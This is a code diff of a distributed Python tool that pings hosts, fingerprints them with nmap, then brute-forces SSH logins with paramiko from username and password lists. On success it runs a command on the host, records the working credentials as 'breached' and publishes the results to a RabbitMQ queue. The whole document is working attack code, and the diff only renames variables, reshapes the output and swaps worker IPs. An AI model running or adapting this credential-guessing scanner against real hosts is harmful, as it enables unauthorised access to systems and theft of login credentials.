@@ -1,7 +1,7 @@
 def compute(hostname):
     import os
     valid = "online"
-    cracked = False
+    breached = False
     credentials = None
     if (os.system("ping -c 1 -w 1 " + hostname)) == 0:
         print("Host", hostname, "is online, starting nmap")
@@ -23,7 +23,6 @@ def compute(hostname):
         else:
             fingerprint = None
         services = []
-        status = "Unknown"
         for serv in host.services:
             services.append(str(serv.port) + "/" + str(serv.service))
             print("Open ports:", services)
@@ -42,14 +41,14 @@ def compute(hostname):
                 for i, uid in enumerate(uid_list):
                     pwd = pwd_list[i]
                     try:
-                        if cracked == False:
+                        if breached == False:
                             time.sleep(0.1)
                             try:
                                 client.connect(hostname,username=uid,password=pwd)
                                 stdin, stdout, stderr = client.exec_command('ls -l')
                                 print("[!] Successfully connected to host", hostname)
                                 status = "Poor SSH Credentials"
-                                cracked = True
+                                breached = True
                                 credentials = [uid, pwd]
                                 client.close()
                             except paramiko.AuthenticationException:
@@ -61,7 +60,7 @@ def compute(hostname):
                         print("Failed to pwn, error:", e)
     else:
         valid = "offline"
-    return hostname, valid, cracked, credentials, fingerprint
+    return hostname, fingerprint, services, breached
 
 if __name__ == '__main__':
     import dispy, time, pika
@@ -70,7 +69,7 @@ if __name__ == '__main__':
 
     print("[i][dispy] Initialising Cluster")
 
-    workers = ['192.168.0.133','192.168.0.110','192.168.0.170','192.168.0.111','192.168.0.153','192.168.0.195']
+    workers = ['192.168.0.133','192.168.0.110','169.254.102.163','169.254.116.199','169.254.114.226','169.254.156.34']
 
     cluster = dispy.JobCluster(compute, nodes=workers, ip_addr='192.168.0.142')
     http_server = dispy.httpd.DispyHTTPServer(cluster)
@@ -102,13 +101,14 @@ if __name__ == '__main__':
     for job in jobs:
         try:
             result = job()
-            hostname, valid, breached, credentials, os_matches = result  # waits for job to finish and returns results
-            result_security = str(hostname) + " is " + str(valid) + ". Breached: " + str(breached) + " with credentials " + str(credentials)
-            print(job.ip_addr,":",result_security)
-            print(os_matches)
-            message = (result_security, os_matches)
+            hostname, fingerprint, services, breached = result  # waits for job to finish and returns results
+            #result_security = str(hostname) + " is " + str(valid) + ". Breached: " str(breached) + " with credentials " + str(credentials)
+            #print(job.ip_addr,":",result_security)
+            #print(os_matches)
+            message = [hostname, fingerprint, services, breached]
+            print(message)
             try:
-                channel.basic_publish(exchange='scan_results_exchange', routing_key='scan_results', body=message)
+                channel.basic_publish(exchange='scan_results_exchange', routing_key='scan_results', body=str(message))
             except Exception as e:
                 print("[!] Message failed to send:", str(e))
             # print('OS Description : {0}'.format(osclass['osfamily']) for osclass in nmap.Portscanner[job.ip_addr]['osclass'])
